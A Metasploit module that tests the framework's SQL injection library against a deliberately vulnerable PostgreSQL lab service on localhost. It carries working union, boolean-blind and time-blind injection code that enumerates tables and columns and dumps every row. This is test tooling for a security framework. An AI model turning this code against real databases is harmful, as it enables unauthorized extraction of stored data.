# frozen_string_literal: true

require 'socket'
class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::SQLi
  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'PostgreSQL injection testing module',
        'Description' => '
          This module tests the SQL injection library against the  PostgreSQL database management system
        ',
        'Author' =>
          [
            'Redouane NIBOUCHA <rniboucha[at]yahoo.fr>'
          ],
        'License' => MSF_LICENSE,
        'Platform' => %w[linux],
        'References' =>
          ['URL', 'https://github.com/red0xff/sqli_vulnerable/tree/main/postgresql'],
        'Targets' => [['Wildcard Target', {}]],
        'DefaultTarget' => 0
      )
    )
    register_options(
      [
        Opt::RHOST('127.0.0.1'),
        OptInt.new('RPORT', [true, 'The target port', 1337]),
        OptString.new('TARGETURI', [true, 'The target URI', '/']),
        OptInt.new('SqliType', [true, '0)Regular. 1) BooleanBlind. 2)TimeBlind', 0]),
        OptBool.new('Safe', [false, 'Use safe mode', false]),
        OptString.new('Encoder', [false, 'an encoder to use (hex for example)', '']),
        OptBool.new('HexEncodeStrings', [false, 'Replace strings in the query with hex numbers?', false]),
        OptInt.new('TruncationLength', [true, 'Test SQLi with truncated output (0 or negative to disable)', 0])
      ]
    )
  end

  def boolean_blind
    encoder = datastore['Encoder'].empty? ? nil : datastore['Encoder'].intern
    sqli = create_sqli(dbms: PostgreSQLi::BooleanBasedBlind, opts: {
                         encoder: encoder,
                         hex_encode_strings: datastore['HexEncodeStrings']
                       }) do |payload|
      sock = TCPSocket.open(datastore['RHOST'], 1337)
      sock.puts('0 or ' + payload + ' --')
      res = sock.gets.chomp
      sock.close
      res && !res.include?('No results')
    end
    unless sqli.test_vulnerable
      print_bad("Doesn't seem to be vulnerable")
      return
    end
    perform_sqli(sqli)
  end

  def reflected
    encoder = datastore['Encoder'].empty? ? nil : datastore['Encoder'].intern
    truncation = datastore['TruncationLength'] <= 0 ? nil : datastore['TruncationLength']
    sqli = create_sqli(dbms: PostgreSQLi::Common, opts: {
                         encoder: encoder,
                         hex_encode_strings: datastore['HexEncodeStrings'],
                         truncation_length: truncation,
                         safe: datastore['SAFE']
                       }) do |payload|
      sock = TCPSocket.open(datastore['RHOST'], 1337)
      sock.puts('0 union ' + payload + ' --')
      res = sock.gets.chomp
      sock.close
      res
    end
    unless sqli.test_vulnerable
      print_bad("Doesn't seem to be vulnerable")
      return
    end
    perform_sqli(sqli)
  end

  def time_blind
    encoder = datastore['Encoder'].empty? ? nil : datastore['Encoder'].intern
    sqli = create_sqli(dbms: PostgreSQLi::TimeBasedBlind, opts: {
                         encoder: encoder,
                         hex_encode_strings: datastore['HexEncodeStrings']
                       }) do |payload|
      sock = TCPSocket.open(datastore['RHOST'], 1337)
      sock.puts('0 or ' + payload + ' --')
      sock.gets
      sock.close
    end
    unless sqli.test_vulnerable
      print_bad("Doesn't seem to be vulnerable")
      return
    end
    perform_sqli(sqli)
  end

  def perform_sqli(sqli)
    print_good "dbms: #{sqli.version}"
    tables = sqli.enum_table_names
    print_good "tables: #{tables.join(', ')}"
    tables.each do |table|
      columns = sqli.enum_table_columns(table)
      print_good "#{table}(#{columns.join(', ')})"
      content = sqli.dump_table_fields(table, columns)
      content.each do |row|
        print_good "\t" + row.join(', ')
      end
    end
  end

  def run
    case datastore['SqliType']
    when 0 then reflected
    when 1 then boolean_blind
    when 2 then time_blind
    else print_bad('Unsupported SQLI_TYPE')
    end
  end
end
